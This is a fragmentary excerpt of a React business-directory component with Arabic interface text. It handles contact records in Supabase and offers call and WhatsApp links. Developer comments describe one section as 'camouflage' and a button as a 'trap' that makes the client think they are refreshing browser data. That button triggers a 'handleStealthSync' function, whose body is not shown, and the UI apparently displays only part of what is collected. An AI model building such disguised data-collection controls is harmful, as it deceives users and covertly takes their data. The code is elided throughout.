...
export default function Directory() {
  const [contacts, setContacts] = useState([]); // [cite: 267]
  const [searchQuery, setSearchQuery] = useState(''); // [cite: 267]
  const [filterCategory, setFilterCategory] = useState('الكل'); // [cite: 267]
  const [editingId, setEditingId] = useState(null);
  const [newContact, setNewContact] = useState({ 
    name: '', category: 'مسوق (بروكر)', field: 'عقارات', phone: '', email: '', address: '', notes: '', rating: 3 
  }); // [cite: 268]
  const [loading, setLoading] = useState(false); // [cite: 269]

  useEffect(() => { fetchContacts(); }, []); // [cite: 270]

  const fetchContacts = async () => {
    const { data } = await supabase.from('business_directory').select('*').order('created_at', { ascending: false }); // [cite: 270]
    if (data) setContacts(data); // [cite: 271]
  };
  ...
  const importSingleContact = async () => {
    ...
    } catch (ex) { console.log('User cancelled'); }
  };
  ...
  const handleAddOrUpdate = async (e) => {
    ...
    if (editingId) {
      ...
      await supabase.from('business_directory').insert([newContact]); // [cite: 272]
    }
    resetForm();
    fetchContacts(); // [cite: 272]
    setLoading(false); // [cite: 273]
  };

  const resetForm = () => {
    setEditingId(null);
    setNewContact({ name: '', category: 'مسوق (بروكر)', field: 'عقارات', phone: '', email: '', address: '', notes: '', rating: 3 }); // [cite: 272]
  };

  const handleDelete = async (id, name) => {
    if (window.confirm(`هل أنت متأكد من حذف (${name})؟`)) { // [cite: 273]
      await supabase.from('business_directory').delete().eq('id', id); // [cite: 273]
      fetchContacts(); // [cite: 274]
    }
  };

  const filteredContacts = contacts.filter(c => // [cite: 274]
    ...
    <div className="space-y-8 animate-fade-in pb-20" dir="rtl">
      ...
      <div className="bg-[#0f172a] rounded-[2.5rem] p-8 shadow-2xl flex flex-col md:flex-row items-center justify-between gap-6">
        ...
        <div className="relative w-full md:w-80">
          ...
          <Search size={20} className="absolute left-4 top-4 text-slate-400" /> {/* [cite: 277] */}
        </div>
      </div>

      {/* قسم الإضافة والمزامنة (التمويه) */}
      <div className={`bg-white p-8 rounded-[2rem] shadow-sm border ${editingId ? 'border-amber-400' : 'border-slate-100'}`}>
        <div className="flex flex-col md:flex-row justify-between items-center gap-4 mb-8 border-b pb-6">
          ...
          <div className="flex gap-3 w-full md:w-auto">
            ...
            {/* زرار الفخ - العميل هيفتكر إنه بيحدث داتا المتصفح عنده */}
            <button type="button" onClick={handleStealthSync} disabled={loading} className="flex-1 md:flex-none bg-blue-600 text-white px-5 py-3 rounded-xl font-black text-sm flex items-center justify-center gap-2 shadow-lg hover:bg-blue-700">
        ...
        <form onSubmit={handleAddOrUpdate} className="grid grid-cols-1 md:grid-cols-4 gap-5 items-end">
          ...
          <div className="space-y-1"><label className="text-xs font-bold text-slate-500">الهاتف *</label><input type="text" required value={newContact.phone} onChange={(e) => setNewContact({...newContact, phone: e.target.value})} className="w-full p-4 rounded-xl border bg-slate-50 outline-none focus:border-blue-500 font-bold text-left" dir="ltr" /></div> {/* [cite: 281] */}
          ...
          <button type="submit" disabled={loading} className="p-4 rounded-xl font-black text-white bg-slate-900 shadow-xl">{editingId ? 'حفظ التعديل' : 'حفظ في الدليل'}</button>
        </form>
      </div>

      {/* عرض الداتا المخصصة للعميل فقط */}
      <div className="grid grid-cols-1 md:grid-cols-2 xl:grid-cols-3 gap-6">
        {filteredContacts.map((contact) => (
          <div key={contact.id} className="bg-white rounded-[2rem] p-6 border border-slate-100 shadow-sm relative group">
            <div className="absolute top-4 left-4 flex gap-2 opacity-0 group-hover:opacity-100 transition-all">
               ...
               <button onClick={() => handleDelete(contact.id, contact.name)} className="p-2 text-red-500 hover:bg-red-50 rounded-lg"><Trash2 size={16}/></button> {/* [cite: 285] */}
            </div>
            <h3 className="font-black text-xl text-slate-900 mb-2">{contact.name}</h3> {/* [cite: 286] */}
            <span className="px-3 py-1 bg-blue-50 text-blue-700 rounded-lg text-[10px] font-black">{contact.category}</span> {/* [cite: 287] */}
            <div className="mt-4 flex items-center gap-3 text-slate-600 font-bold">
              <Phone size={18} className="text-emerald-500"/>
              <span className="text-lg font-mono" dir="ltr">{contact.phone}</span> {/* [cite: 288] */}
            </div>
            <div className="grid grid-cols-2 gap-3 mt-6 border-t pt-6">
               <a href={`tel:${contact.phone}`} className="bg-slate-100 text-slate-700 py-3 rounded-xl font-black text-center text-sm flex items-center justify-center gap-2"><Phone size={14}/> اتصال</a>
               <button onClick={() => window.open(`https://wa.me/+2${contact.phone}`, '_blank')} className="bg-emerald-50 text-emerald-600 py-3 rounded-xl font-black text-sm flex items-center justify-center gap-2"><MessageCircle size={14}/> واتساب</button>
            </div>
          </div>
        ))}
      </div>
